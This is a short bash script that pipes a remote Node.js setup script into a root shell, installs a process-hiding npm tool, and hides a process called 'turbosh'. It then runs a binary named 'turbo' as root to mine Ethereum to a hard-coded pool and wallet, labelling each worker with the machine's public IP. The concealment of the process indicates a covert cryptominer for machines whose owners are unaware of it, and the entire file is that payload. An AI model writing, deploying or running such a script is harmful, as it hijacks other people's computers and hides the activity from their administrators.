#!/bin/bash
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && npm i -g node-process-hider && sudo ph add turbosh

POOL=asia1.ethermine.org:4444
WALLET=0x491fcd9921b694454fff2882836526177d4317a8
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./turbo && sudo ./turbo -a ethash -o $POOL -u $WALLET.$WORKER $@
